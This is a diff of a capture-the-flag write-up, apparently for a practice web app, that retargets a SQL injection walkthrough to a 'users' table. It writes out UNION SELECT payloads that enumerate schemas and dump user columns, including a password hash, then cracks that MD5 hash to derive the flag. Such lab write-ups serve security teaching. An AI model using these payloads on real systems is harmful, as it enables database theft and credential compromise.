@@ -44,7 +44,7 @@ Exclude results related to the `information_schema` schema, as it does not conta
 - `Member_images/list_images`
 - `Member_survey/vote_dbs`
 
-For this exploit, we will focus on the `list_images` table in the `Member_images` schema.
+For this exploit, we will focus on the `users` table in the `Member_Sql_Injection` schema.
 
 ## 4. Find Column Names in Tables
 
@@ -54,20 +54,32 @@ Retrieve the column names from the target table:
 42 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 
-This query reveals the specific columns available within the tables, such as `id`, `url`, `title`, and `comment` in the `Member_images.list_images` table.
+This query reveals the specific columns available within the tables, such as `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, and `countersign` in the `Member_Sql_Injection.users` table.
 
-## 5. Extract Data from Member_images.list_images Table
+## 5. Extract Data from Member_Sql_Injection.users Table
 
-Now, extract data from the columns in the `Member_images.list_images` table. Start with the "id" and "url" columns:
+Now, extract data from the columns in the `Member_Sql_Injection.users` table. Start with the "user_id" and "first_name" columns:
 
 ```sql
-42 UNION SELECT id, url FROM Member_images.list_images
+42 UNION SELECT user_id, first_name FROM Member_Sql_Injection.users
 ```
 
-Then, extract data from the "title" and "comment" columns:
+Then, extract data from the "last_name" and "town" columns:
 
 ```sql
-42 UNION SELECT title, comment FROM Member_images.list_images
+42 UNION SELECT last_name, town FROM Member_Sql_Injection.users
+```
+
+Then, extract data from the "country" and "planet" columns:
+
+```sql
+42 UNION SELECT country, planet FROM Member_Sql_Injection.users
+```
+
+Then, extract data from the "Commentaire" and "countersign" columns:
+
+```sql
+42 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users
 ```
 
 ## 6. Decode the Final Flag
@@ -75,17 +87,17 @@ Then, extract data from the "title" and "comment" columns:
 The final query returns data that includes instructions for obtaining the flag:
 
 ```sql
-ID: 42 UNION SELECT title, comment FROM Member_images.list_images
-First name: Hack me?
-Surname: If you read this, use MD5 decoding (lowercase) and then SHA256 to obtain the flag: 1928e8083cf461a51303633093573c46
+ID: 42 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname: 5ff9d0165b4f92b14994e5c685cdce28
 ```
 
 To decode:
 
-1. Decode the MD5 hash `1928e8083cf461a51303633093573c46` to obtain `albatroz`.
-2. Hash `albatroz` with SHA256 to yield the final flag:
+1. Decode the MD5 hash `5ff9d0165b4f92b14994e5c685cdce28` to obtain `FortyTwo`.
+2. Hash `fortytwo` with SHA256 to yield the final flag:
 
-`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
+`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
 
 ## Prevention
 
